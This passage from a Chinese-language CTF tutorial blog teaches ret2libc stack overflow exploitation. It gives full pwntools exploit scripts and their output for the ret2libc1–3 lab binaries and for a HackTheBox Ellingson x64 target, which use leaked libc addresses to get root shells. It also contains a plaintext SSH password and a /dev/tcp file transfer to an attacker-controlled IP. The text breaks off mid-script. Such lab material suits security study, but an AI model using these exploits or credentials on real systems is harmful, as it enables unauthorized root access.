canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x8048000)\n    Stripped:   No\n    Debuginfo:  Yes\n```\n\n因为这里用了动态链接库，所以优先使用 `ret2libc`\n\n字符串中能看到 `/bin/sh` `08048720`\n\n![image.png](/post-images/PWN%20-%20基本ROP/image9.png)\n\n尝试寻找 `system`函数，也找到了`08048460`\n\n![image.png](/post-images/PWN%20-%20基本ROP/image10.png)\n\n计算偏移值（和上边一样的操作）\n\n```bash\npwndbg> cyclic -l daab\nFinding cyclic pattern of 4 bytes: b'daab' (hex: 0x64616162)\nFound at offset 112\n```\n\n```bash\n(pwn) ➜  ret2libc cat exp.py \nfrom pwn import *\n\nsystem_plt_addr = 0x08048460\nbin_sh_addr = 0x8048720\nsh = process('./ret2libc1')\nsh.sendline(112 * b'A' + p32(system_plt_addr) + 4 * b'A' + p32(bin_sh_addr))\nsh.interactive()\n```\n\n可以看到为什么要加上 `4 * b'A'` ，因为这是给`system`的假的返回地址\n\n```bash\n           | ... higher addresses ...   |\n           +----------------------------+\n           | p32(bin_sh_addr)           | <-- (被我们写入) system 的参数\n           +----------------------------+\n           | 4 * b'A' (0x41414141)      | <-- (被我们写入) system 的假返回地址\n           +----------------------------+\n           | p32(system_plt_addr)       | <-- (被我们写入) 覆盖了 main 的返回地址\n           +----------------------------+\n           | 4 字节的 'A'               | <-- (被我们写入) 覆盖了 old EBP\n           +----------------------------+\n           | 108 字节的 'A'             | \\\n           | ...                        |  |\n           | 'A'                        |  } 填充了整个 buffer 和额外的空间\n           | 'A'                        | /\n           +----------------------------+ <-- buffer 的起始地址\n           | ... lower addresses ...    |\n```\n\n```bash\n(pwn) ➜  ret2libc python exp.py\n[+] Starting local process './ret2libc1': pid 3166\n[*] Switching to interactive mode\nRET2LIBC >_<\n$ whoami\nroot\n```\n\n### ret2libc2\n\n依旧是 `gets` ，存在缓冲区溢出漏洞\n\n![image.png](/post-images/PWN%20-%20基本ROP/image11.png)\n\n`checksec`以及文件类型，和`ret2libc1`基本没差\n\n```bash\n(pwn) ➜  ret2libc checksec ret2libc1\n[*] '/root/Desktop/Test/StackBufferOverFlow/ret2libc/ret2libc1'\n    Arch:       i386-32-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x8048000)\n    Stripped:   No\n    Debuginfo:  Yes\n(pwn) ➜  ret2libc file ret2libc2         \nret2libc2: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=83535a471d9ef90c3d5ff7f077944fb6021787a1, with debug_info, not stripped\n```\n\n字符串中找不到 `/bin/sh`了\n\n![image.png](/post-images/PWN%20-%20基本ROP/image12.png)\n\n`system` 函数还在 `0x08048490`\n\n![image.png](/post-images/PWN%20-%20基本ROP/image13.png)\n\n所以需要我们构造 `/bin/sh` `0x08048480`\n\n可以看到还存在`gets` `0x08048460`\n\n![image.png](/post-images/PWN%20-%20基本ROP/image14.png)\n\n我们可以多调用一次`gadget` ，所以我们要找到一片可读写的缓冲区\n\n![image.png](/post-images/PWN%20-%20基本ROP/image15.png)\n\n`buf2`区域刚好可以 `0x0804A080`\n\n![image.png](/post-images/PWN%20-%20基本ROP/image16.png)\n\n此时我们还要保持堆栈平衡，也就是`gets`执行完时，`gets`的返回地址会处于栈顶，但是接下来我们调用`system`函数，所以我们需要在返回地址`+4`(就是要把`buf`清理掉，让`ROP`链指向下一条也就是`system`)，所以这里可以寻找 `pop xxx ;ret` 或者 `add esp 4; ret`\n\n```bash\nESP --> | p32(pop_ebx_addr) |  <-- gets函数的“返回地址”\n        +-------------------+\n        |  p32(buf2_addr)   |  <-- gets函数的参数（gets写入后，我们需要将其弹出）\n        +-------------------+\n        | p32(libc_system_addr) |\n        +-------------------+\n        |      b'B'*4       |\n        +-------------------+\n        |  p32(buf2_addr)   |\n        +-------------------+\n```\n\n使用`ROPgadget`来寻找`0x0804843d` 就符合\n\n```bash\n(pwn) ➜  ret2libc ROPgadget --binary ret2libc2 --only \"pop|ret\"\nGadgets information\n============================================================\n0x0804872f : pop ebp ; ret\n0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n0x0804843d : pop ebx ; ret\n```\n\n计算偏移值，也和上边一样是`112`\n\n```bash\nfrom pwn import *\n\ngets_plt_addr = 0x08048460\npop_ebx_ret_addr = 0x0804843d\nsystem_plt_addr = 0x08048490\nbuf2 = 0x0804A080\n\nsh = process('./ret2libc2')\nsh.sendline(112 * b'A' + p32(gets_plt_addr) + p32(pop_ebx_ret_addr) + p32(buf2) + p32(system_plt_addr) + 4 * b'A' + p32(buf2))\nsh.sendline('/bin/sh')\nsh.interactive()\n```\n\n```bash\n(pwn) ➜  ret2libc python exp.py   \n[+] Starting local process './ret2libc2': pid 4087\n/root/Desktop/Test/StackBufferOverFlow/ret2libc/exp.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  sh.sendline('/bin/sh')\n[*] Switching to interactive mode\nSomething surprise here, but I don't think it will work.\nWhat do you think ?$ id\nuid=0(root) gid=0(root) 组=0(root)\n```\n\n### ret2libc3\n\n依旧是`gets`\n\n![image.png](/post-images/PWN%20-%20基本ROP/image17.png)\n\n保护机制和文件类型\n\n```bash\n➜  ret2libc checksec ret2libc3\n[*] '/root/Desktop/Test/StackBufferOverFlow/ret2libc/ret2libc3'\n    Arch:       i386-32-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x8048000)\n    Stripped:   No\n    Debuginfo:  Yes\n➜  ret2libc file ret2libc3\nret2libc3: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=c0ad441ebd58b907740c1919460c37bb99bb65df, with debug_info, not stripped\n```\n\n存在`gets`，可以用来构造`/bin/sh`\n\n![image.png](/post-images/PWN%20-%20基本ROP/image18.png)\n\n![image.png](/post-images/PWN%20-%20基本ROP/image19.png)\n\n但是`system`函数也没了，所以我们要寻找`system`函数\n\n找到`system()`函数和`/bin/sh`字符串在`libc`中的地址\n\n- 首先获得一个函数的真实地址，例如：`__libc_start_main`，`puts`\n- 得到真实地址后，根据最后三位即可得到 libc 版本\n- 得到 libc 版本后就可以很容易确定获得的真实函数的偏移地址（这里假设`puts`）\n- 计算基地址，基地址 = puts 函数真实地址 - puts 函数偏移地址\n- 得到 libc 版本后获取 system 地址与 /bin/sh 的偏移地址\n- 根据 真实地址 = 基地址 + 偏移地址\n- 再次执行源程序\n- 触发栈溢出执行 `system(‘/bin/sh’)`\n\n编写脚本泄露`libc_start_main`的真实地址\n\n```bash\nfrom pwn import *\ne = ELF('./ret2libc3')\nsh = process('./ret2libc3')\nputs_plt_addr = e.plt['puts']\nlibc_start_main_got_addr = e.got['__libc_start_main']\nmain_addr = e.symbols['main']\n\nprint('泄露 libc_start_main_got_addr 并返回到 main')\npayload1 = b'A' * 112 + p32(puts_plt_addr) + p32(main_addr) + p32(libc_start_main_got_addr)\nsh.sendlineafter(b'Can you find it !?',payload1)\nlibc_start_main_real_addr = u32(sh.recv()[0:4])\nprint(f\"libc_start_main_real_addr:{hex(libc_start_main_real_addr)}\")\n```\n\n![image.png](/post-images/PWN%20-%20基本ROP/image20.png)\n\n再下一步我们要得到 `libc`版本和基地址以及`system` 函数和`/bin/sh`字符串的地址\n\n```bash\nfrom pwn import *\nfrom LibcSearcher import *\ne = ELF('./ret2libc3')\nsh = process('./ret2libc3')\nputs_plt_addr = e.plt['puts']\nlibc_start_main_got_addr = e.got['__libc_start_main']\nmain_addr = e.symbols['main']\n\nprint('泄露 libc_start_main_got_addr 并返回到 main')\npayload1 = b'A' * 112 + p32(puts_plt_addr) + p32(main_addr) + p32(libc_start_main_got_addr)\nsh.sendlineafter(b'Can you find it !?',payload1)\nlibc_start_main_real_addr = u32(sh.recv()[0:4])\nprint(f\"libc_start_main_real_addr:{hex(libc_start_main_real_addr)}\")\n\nprint('得到 libc 版本，并计算基地址和 system & /bin/sh 地址')\nlibc = LibcSearcher(\"__libc_start_main\", libc_start_main_real_addr)\nlibcbase = libc_start_main_real_addr - libc.dump('__libc_start_main')\nsystem_addr = libcbase + libc.dump('system')\nbin_sh_addr = libcbase + libc.dump('/bin/sh')\nprint(f'基地址:{libcbase},system地址:{system_addr},/bin/sh地址:{bin_sh_addr}')\n```\n\n这里吐槽一下`LibcSearcher` ，一直提示`[+] No libc satisfies constraints.` 貌似`fork`太久远了没更新\n\n这里直接链接本地的`libc`库了，不使用`LibcSearcher`\n\n```bash\nfrom pwn import *\ne = ELF('./ret2libc3')\nlibc = ELF(\"/lib32/libc.so.6\")\nsh = process('./ret2libc3')\nputs_plt_addr = e.plt['puts']\nlibc_start_main_got_addr = e.got['__libc_start_main']\nmain_addr = e.symbols['main']\n\nprint('泄露 libc_start_main_got_addr 并返回到 main')\npayload1 = b'A' * 112 + p32(puts_plt_addr) + p32(main_addr) + p32(libc_start_main_got_addr)\nsh.sendlineafter(b'Can you find it !?',payload1)\nlibc_start_main_real_addr = u32(sh.recv()[0:4])\nprint(f\"libc_start_main_real_addr:{hex(libc_start_main_real_addr)}\")\n\nprint('计算基地址和 system & /bin/sh 地址')\nlibcbase = libc_start_main_real_addr - libc.sym['__libc_start_main']\nsystem_addr = libcbase + libc.sym['system']\nbin_sh_addr = libcbase + next(libc.search(b\"/bin/sh\"))\nprint(f'基地址:{hex(libcbase)},system地址:{hex(system_addr)},/bin/sh地址:{hex(bin_sh_addr)}')\n```\n\n所有参数我们都有了，就可以构造`payload`了\n\n1. 方案 `1`（这里仿照`wiki`上的写）：\n    \n    ```bash\n    from pwn import *\n    e = ELF('./ret2libc3')\n    p = process('./ret2libc3')\n    libc = ELF('/lib32/libc.so.6')\n    \n    puts_plt_addr = e.plt['puts']\n    libc_start_main_addr = e.got['__libc_start_main']\n    main_addr = e.symbols['main']\n    payload1 = b'A' * 112 + p32(puts_plt_addr) + p32(main_addr) + p32(libc_start_main_addr)\n    p.sendlineafter(\"Can you find it !?\", payload1)\n    libc_start_main_real_addr = u32(p.recv()[0:4])\n    print(f\"libc_start_main_real_addr = {hex(libc_start_main_real_addr)}\")\n    \n    libcbase = libc_start_main_real_addr - libc.sym['__libc_start_main']\n    print(f\"libcbase = {hex(libcbase)}\")\n    system_real_addr = libcbase + libc.sym['system']\n    print(f\"system_real_addr = {hex(system_real_addr)}\")\n    bin_sh_addr = libcbase + next(libc.search(b\"/bin/sh\"))\n    print(f\"bin_sh_addr = {hex(bin_sh_addr)}\")\n    payload2 = b'A' * 104+ p32(system_real_addr) + b'A' * 4 + p32(bin_sh_addr)\n    p.sendline(payload2)\n    p.interactive()\n    ```\n    \n    输出（失败了）：\n    \n    ```bash\n    (pwn) ➜  ret2libc python exp.py\n    [*] '/root/Desktop/Test/StackBufferOverFlow/ret2libc/ret2libc3'\n        Arch:       i386-32-little\n        RELRO:      Partial RELRO\n        Stack:      No canary found\n        NX:         NX enabled\n        PIE:        No PIE (0x8048000)\n        Stripped:   No\n        Debuginfo:  Yes\n    [+] Starting local process './ret2libc3': pid 4574\n    [*] '/lib32/libc.so.6'\n        Arch:       i386-32-little\n        RELRO:      Full RELRO\n        Stack:      Canary found\n        NX:         NX enabled\n        PIE:        PIE enabled\n    /root/Desktop/Tools/pwn/lib/python3.13/site-packages/pwnlib/tubes/tube.py:876: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n      res = self.recvuntil(delim, timeout=timeout)\n    libc_start_main_real_addr = 0x206f4e0a\n    libcbase = 0x206d010a\n    system_real_addr = 0x2072232a\n    bin_sh_addr = 0x20896f5c\n    [*] Switching to interactive mode\n    [*] Got EOF while reading in interactive\n    $ id\n    [*] Process './ret2libc3' stopped with exit code -11 (SIGSEGV) (pid 4574)\n    [*] Got EOF while sending in interactive\n    ```\n    \n2. 方案 2（大佬通过`puts`而不是`libc_start_main` ，并且二次返回到的更早之前）：\n    \n    ```bash\n    from pwn import *\n    e = ELF('./ret2libc3')\n    p = process('./ret2libc3')\n    libc = ELF('/lib32/libc.so.6')\n    \n    puts_plt_addr = e.plt['puts']\n    puts_got_addr = e.got['puts']\n    main_addr = e.symbols['_start']\n    payload1 = b'A' * 112 + p32(puts_plt_addr) + p32(main_addr) + p32(puts_got_addr)\n    p.sendlineafter(\"Can you find it !?\", payload1)\n    puts_real_addr = u32(p.recv()[0:4])\n    print(f\"puts_real_addr = {hex(puts_real_addr)}\")\n    \n    libcbase = puts_real_addr - libc.sym['puts']\n    print(f\"libcbase = {hex(libcbase)}\")\n    system_real_addr = libcbase + libc.sym['system']\n    print(f\"system_real_addr = {hex(system_real_addr)}\")\n    bin_sh_addr = libcbase + next(libc.search(b\"/bin/sh\"))\n    print(f\"bin_sh_addr = {hex(bin_sh_addr)}\")\n    payload2 = b'A' * 112 + p32(system_real_addr) + b'A' * 4 + p32(bin_sh_addr)\n    p.sendline(payload2)\n    p.interactive()\n    ```\n    \n    输出（成功）：\n    \n    ```bash\n    (pwn) ➜  ret2libc python exp.py\n    [*] '/root/Desktop/Test/StackBufferOverFlow/ret2libc/ret2libc3'\n        Arch:       i386-32-little\n        RELRO:      Partial RELRO\n        Stack:      No canary found\n        NX:         NX enabled\n        PIE:        No PIE (0x8048000)\n        Stripped:   No\n        Debuginfo:  Yes\n    [+] Starting local process './ret2libc3': pid 4630\n    [*] '/lib32/libc.so.6'\n        Arch:       i386-32-little\n        RELRO:      Full RELRO\n        Stack:      Canary found\n        NX:         NX enabled\n        PIE:        PIE enabled\n    /root/Desktop/Tools/pwn/lib/python3.13/site-packages/pwnlib/tubes/tube.py:876: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n      res = self.recvuntil(delim, timeout=timeout)\n    puts_real_addr = 0xf7da72a0\n    libcbase = 0xf7d2b000\n    system_real_addr = 0xf7d7d220\n    bin_sh_addr = 0xf7ef1e52\n    [*] Switching to interactive mode\n    $ id\n    uid=0(root) gid=0(root) 组=0(root)\n    ```\n    \n3. 方案3，修复`wiki`上的方案\n    \n    不使用`__libc_start_main` 来获取第一个真实地址，而使用`puts`\n    \n    ```bash\n    (pwn) ➜  ret2libc cat exp.py\n    from pwn import *\n    e = ELF('./ret2libc3')\n    p = process('./ret2libc3')\n    libc = ELF('/lib32/libc.so.6')\n    \n    puts_plt_addr = e.plt['puts']\n    libc_start_main_addr = e.got['puts']\n    main_addr = e.symbols['main']\n    payload1 = b'A' * 112 + p32(puts_plt_addr) + p32(main_addr) + p32(libc_start_main_addr)\n    p.sendlineafter(\"Can you find it !?\", payload1)\n    libc_start_main_real_addr = u32(p.recv()[0:4])\n    print(f\"libc_start_main_real_addr = {hex(libc_start_main_real_addr)}\")\n    \n    libcbase = libc_start_main_real_addr - libc.sym['puts']\n    print(f\"libcbase = {hex(libcbase)}\")\n    system_real_addr = libcbase + libc.sym['system']\n    print(f\"system_real_addr = {hex(system_real_addr)}\")\n    bin_sh_addr = libcbase + next(libc.search(b\"/bin/sh\"))\n    print(f\"bin_sh_addr = {hex(bin_sh_addr)}\")\n    payload2 = b'A' * 104+ p32(system_real_addr) + b'A' * 4 + p32(bin_sh_addr)\n    p.sendline(payload2)\n    p.interactive()\n    ```\n    \n    输出（成功）\n    \n    ```bash\n    (pwn) ➜  ret2libc python exp.py\n    [*] '/root/Desktop/Test/StackBufferOverFlow/ret2libc/ret2libc3'\n        Arch:       i386-32-little\n        RELRO:      Partial RELRO\n        Stack:      No canary found\n        NX:         NX enabled\n        PIE:        No PIE (0x8048000)\n        Stripped:   No\n        Debuginfo:  Yes\n    [+] Starting local process './ret2libc3': pid 6021\n    [*] '/lib32/libc.so.6'\n        Arch:       i386-32-little\n        RELRO:      Full RELRO\n        Stack:      Canary found\n        NX:         NX enabled\n        PIE:        PIE enabled\n    /root/Desktop/Tools/pwn/lib/python3.13/site-packages/pwnlib/tubes/tube.py:876: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n      res = self.recvuntil(delim, timeout=timeout)\n    libc_start_main_real_addr = 0xf7d902a0\n    libcbase = 0xf7d14000\n    system_real_addr = 0xf7d66220\n    bin_sh_addr = 0xf7edae52\n    [*] Switching to interactive mode\n    $ id\n    uid=0(root) gid=0(root) 组=0(root)\n    ```\n    \n    为什么第二次调用时使用`104`来填充栈而不是`112`？\n    \n    因为程序真正的入口是`_start`，而不是`main` ，我们来看`_start`\n    \n    ![image.png](/post-images/PWN%20-%20基本ROP/image21.png)\n    \n    调用`main`前会先调用`and     esp, 0FFFFFFF0h` 来使堆栈平衡\n    \n    可以在 `_start` 处断点，然后`si`来一步一步调试查看 `esp` 的变化\n    \n    第一次我们运行`payload1`的时候是直接从`_start`开始运行的，会经过`and     esp, 0FFFFFFF0h` 使堆栈平衡，使栈 `+8` 得到`112` ，但是我们第二次执行`payload2`不是从`_start`开始，直接从`main`开始，`and`不执行，所以没有`+8` ，所以此时esp到覆盖返回地址为`112-8=104`\n    \n    > https://xz.aliyun.com/news/14087\n    > \n    \n    也可以说第一次运行 `_start` + `main` 一共 `112` ，而第二次直接从`main`开始一共用了`104`\n    \n\n### 方案`1`失败的原因是\n\n泄露的地址不正确（坏字符问题）\n\n`libc_start_main_real_addr` 的值是 `0x206f4e0a`。`puts` 函数是用来打印字符串的，它遇到 `\\n` (`0x0a`) 就会停止读取并输出换行符，然后返回。看一下这个地址 `0x206f4e0a`，它的最后一个字节是 `0a`，也就是换行符 `\\n`。这就导致解包出来的 `libc_start_main_real_addr` 是一个完全错误的值 `0x206f4e0a`\n\n\n### ret2libc - x64\n\n来自 `HackTheBox - Ellingson` \n\n运行它的时候，会让你输入密码\n\n```bash\nmargo@ellingson:~$ garbage\nEnter access password: 111111111111111111111111111111111111111111111111111111\n\naccess denied.\n```\n\n拉出去逆向看一眼\n\n```bash\nint __fastcall __noreturn main(int argc, const char **argv, const char **envp)\n{\n  int v3; // [rsp+8h] [rbp-8h] BYREF\n  unsigned int v4; // [rsp+Ch] [rbp-4h]\n\n  v4 = check_user(argc, argv, envp);\n  set_username(v4);\n  if ( !(unsigned int)auth(v4) )\n    exit(-1);\n  puts(\"[+] W0rM || Control Application\");\n  puts(\"[+] ---------------------------\");\n  puts(\"Select Option\");\n  puts(\"1: Check Balance\");\n  puts(\"2: Launch\");\n  puts(\"3: Cancel\");\n  puts(\"4: Exit\");\n  while ( 1 )\n  {\n    while ( 1 )\n    {\n      while ( 1 )\n      {\n        printf(\"> \");\n        __isoc99_scanf(\"%d%*c\", &v3);\n        if ( v3 != 2 )\n          break;\n        launch();\n      }\n      if ( v3 > 2 )\n        break;\n      if ( v3 != 1 )\n        goto LABEL_14;\n      checkbalance();\n    }\n    if ( v3 != 3 )\n    {\n      if ( v3 == 4 )\n        exit(0);\nLABEL_14:\n      puts(\"Unknown option\");\n      exit(-1);\n    }\n    cancel();\n  }\n}\n```\n\n我们在开始运行的 `auth` 函数中发现了存在缓冲区溢出漏洞\n\n也就是让我们输入密码的地方，会有缓冲区溢出，`gets()` 函数会无限制地读取用户的输入，直到遇到换行符。如果攻击者输入一个超长的字符串（例如`200`个字符），多出来的`100`个字符就会溢出，覆盖掉栈上 `s1` 相邻的其他数据。\n\n```bash\n__int64 __fastcall auth(int a1)\n{\n  char dest[112]; // [rsp+10h] [rbp-F0h] BYREF\n  char s1[100]; // [rsp+80h] [rbp-80h] BYREF\n  char v4[12]; // [rsp+E4h] [rbp-1Ch] BYREF\n  int v5; // [rsp+F0h] [rbp-10h]\n\n  v5 = a1;\n  strcpy(v4, username);\n  printf(\"Enter access password: \");\n  gets(s1);\n  putchar(10);\n  if ( !strcmp(s1, \"N3veRF3@r1iSh3r3!\") )\n  {\n    strcpy(dest, \"access granted for user: \");\n    strcat(dest, v4);\n    syslog(6, dest);\n    puts(\"access granted.\");\n    return 1LL;\n  }\n  else\n  {\n    puts(\"access denied.\");\n    return 0LL;\n  }\n}\n```\n\n`64`位程序\n\n```bash\n➜  Ellingson file garbage \ngarbage: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=de1fde9d14eea8a6dfd050fffe52bba92a339959, not stripped\n```\n\n保护措施情况，开启了`NX` \n\n```bash\n➜  Ellingson checksec garbage \n[*] Checking for new versions of pwntools\n    To disable this functionality, set the contents of /root/.cache/.pwntools-cache-3.13/update to 'never' (old way).\n    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):\n        [update]\n        interval=never\n[*] You have the latest version of Pwntools (4.14.1)\n[*] '/root/Desktop/HackTheBox/Ellingson/garbage'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    Stripped:   No\n```\n\n检查一下是否开启了 `ALSR` ，开启了完全`ALSR`\n\n```bash\nmargo@ellingson:~$ cat /proc/sys/kernel/randomize_va_space\n2\n```\n\n这里要使用 `ret2libc` 攻击\n\n寻找一个真实的地址，首先我们查看`libc`文件\n\n```bash\nmargo@ellingson:~$ ldd /usr/bin/garbage \n        linux-vdso.so.1 (0x00007ffcd37ec000)\n        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff0364b2000)\n        /lib64/ld-linux-x86-64.so.2 (0x00007ff0368a3000)\n```\n\n将`/lib/x86_64-linux-gnu/libc.so.6`下载到靶机中\n\n```bash\n// kali\n➜  Ellingson nc -lvp 1234 > libc.so.6\n// Machine\nmargo@ellingson:~$ cat /lib/x86_64-linux-gnu/libc.so.6 > /dev/tcp/your-ip/1234\n```\n\n首先判断填充值，这里使用`garbage` \n\n```bash\n(pwn) ➜  Ellingson pwndbg garbage \npwndbg> cyclic 1024\naaaabaaacaaadaaa...acwaacxaacyaac\npwndbg> run\nStarting program: /root/Desktop/HackTheBox/Ellingson/garbage \n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\nEnter access password:aaaabaaacaaadaaa...acwaacxaacyaac\n```\n\n程序果不其然崩溃了\n\n![image.png](/post-images/PWN%20-%20基本ROP/image22.png)\n\n计算偏移值，这里使用`msf`\n\n```bash\n➜  Ellingson /usr/bin/msf-pattern_create -l 200\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab...Ag0Ag1Ag2Ag3Ag4Ag5Ag\n```\n\n![image.png](/post-images/PWN%20-%20基本ROP/image23.png)\n\n```bash\npwndbg> x/xg 0x7fffffffdf58\n0x7fffffffdf58: 0x3765413665413565\n```\n\n```bash\n(pwn) ➜  Ellingson /usr/bin/msf-pattern_offset -l 200 -q 0x3765413665413565        \n[*] Exact match at offset 136\n```\n\n得到偏移值`136` （PS：这里使用`pwndbg`的`cyclic`无法得到正确偏移值，但是`WP`中使用`gef`等都可以很容易就得到偏移值）\n\n得到偏移值后，我们选择一下获得哪个`plt`函数的真实地址\n\n```bash\npwndbg> plt\nSection .plt 0x401020 - 0x401170:\n0x401030: putchar@plt\n0x401040: strcpy@plt\n0x401050: puts@plt\n0x401060: fclose@plt\n0x401070: getpwuid@plt\n0x401080: getuid@plt\n0x401090: printf@plt\n0x4010a0: rewind@plt\n0x4010b0: fgetc@plt\n0x4010c0: read@plt\n0x4010d0: fgets@plt\n0x4010e0: strcmp@plt\n0x4010f0: getchar@plt\n0x401100: gets@plt\n0x401110: syslog@plt\n0x401120: access@plt\n0x401130: fopen@plt\n0x401140: __isoc99_scanf@plt\n0x401150: strcat@plt\n0x401160: exit@plt\n```\n\n`x64` 传参需要使用寄存器，`0x000000000040179b` 符合\n\n```bash\n(pwn) ➜  Ellingson ROPgadget --binary garbage --only \"pop|ret\"\nGadgets information\n============================================================\n0x0000000000401794 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n0x0000000000401796 : pop r13 ; pop r14 ; pop r15 ; ret\n0x0000000000401798 : pop r14 ; pop r15 ; ret\n0x000000000040179a : pop r15 ; ret\n0x0000000000401793 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n0x0000000000401797 : pop rbp ; pop r14 ; pop r15 ; ret\n0x0000000000401239 : pop rbp ; ret\n0x000000000040179b : pop rdi ; ret\n0x0000000000401799 : pop rsi ; pop r15 ; ret\n0x0000000000401795 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret\n0x0000000000401016 : ret\n0x0000000000401072 : ret 0x2f\n0x000000000040153a : ret 0x4864\n0x0000000000401485 : ret 0x8d48\n0x00000000004012ce : ret 0xd089\n\nUnique gadgets found: 15\n```\n\n这里选择获得`puts@plt` ，我们通过`pwn`连接`ssh` 来调试\n\n```bash\nfrom pwn import *\nr = ssh(host='ellingson.htb', user='margo', password='iamgod$08')\np = r.process('/usr/bin/garbage')\ne = ELF('./garbage')\nlibc = ELF('./libc.so.6')\n\nputs_plt_addr = e.plt['puts']\nputs_got_addr = e.got['puts']\nstart_addr = e.symbols['_start']\npop_rdi_addr = 0x000000000040179b\n\npayload1 = b'A' * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) \np.sendlineafter(b'Enter access password:',payload1)\nputs_real_add = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nprint(f\"puts_real_add:{hex(puts_real_add)}\")\n```\n\n运行后我们的得到了`put`的真实地址`0x7f8eed3569c0`\n\n```bash\n(pwn) ➜  Ellingson python exp.py                              \n[+] Connecting to ellingson.htb on port 22: Done\n[*] margo@ellingson.htb:\n    Distro    Ubuntu 18.04\n    OS:       linux\n    Arch:     amd64\n    Version:  4.15.0\n    ASLR:     Enabled\n    SHSTK:    Disabled\n    IBT:      Disabled\n[+] Starting remote process None on ellingson.htb: pid 21277\n[!] ASLR is disabled for '/usr/bin/garbage'!\n[*] '/root/Desktop/HackTheBox/Ellingson/garbage'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    Stripped:   No\n[*] '/root/Desktop/HackTheBox/Ellingson/libc.so.6'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  puts_real_add = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nputs_real_add:0x7f8eed3569c0\n```\n\n得到基地址，基地址 = puts 函数真实地址 - puts 函数偏移地址\n\n```bash\nfrom pwn import *\nr = ssh(host='ellingson.htb', user='margo', password='iamgod$08')\np = r.process('/usr/bin/garbage')\ne = ELF('./garbage')\nlibc = ELF('./libc.so.6')\n\nputs_plt_addr = e.plt['puts']\nputs_got_addr = e.got['puts']\nstart_addr = e.symbols['_start']\npop_rdi_addr = 0x000000000040179b\n\npayload1 = b'A' * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) \np.sendlineafter(b'Enter access password:',payload1)\nputs_real_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nprint(f\"puts_real_addr:{hex(puts_real_addr)}\")\n\nlibcbase = puts_real_addr - libc.sym['puts']\nprint(f\"libcbase:{hex(libcbase)}\")\n```\n\n```bash\n(pwn) ➜  Ellingson python exp.py\n[+] Connecting to ellingson.htb on port 22: Done\n[*] margo@ellingson.htb:\n    Distro    Ubuntu 18.04\n    OS:       linux\n    Arch:     amd64\n    Version:  4.15.0\n    ASLR:     Enabled\n    SHSTK:    Disabled\n    IBT:      Disabled\n[+] Starting remote process None on ellingson.htb: pid 21460\n[!] ASLR is disabled for '/usr/bin/garbage'!\n[*] '/root/Desktop/HackTheBox/Ellingson/garbage'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    Stripped:   No\n[*] '/root/Desktop/HackTheBox/Ellingson/libc.so.6'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  puts_real_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nputs_real_addr:0x7f7ed83509c0\nlibcbase:0x7f7ed82d0000\n```\n\n获得其他地址，得到基地址后，我们要得到 `system` 和 `/bin/sh`的地址\n\n函数真实地址 = 基地址 + 函数偏移值\n\n```bash\nfrom pwn import *\nr = ssh(host='ellingson.htb', user='margo', password='iamgod$08')\np = r.process('/usr/bin/garbage')\ne = ELF('./garbage')\nlibc = ELF('./libc.so.6')\n\nputs_plt_addr = e.plt['puts']\nputs_got_addr = e.got['puts']\nstart_addr = e.symbols['_start']\npop_rdi_addr = 0x000000000040179b\n\npayload1 = b'A' * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) \np.sendlineafter(b'Enter access password:',payload1)\nputs_real_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nprint(f\"puts_real_addr:{hex(puts_real_addr)}\")\n\nlibcbase = puts_real_addr - 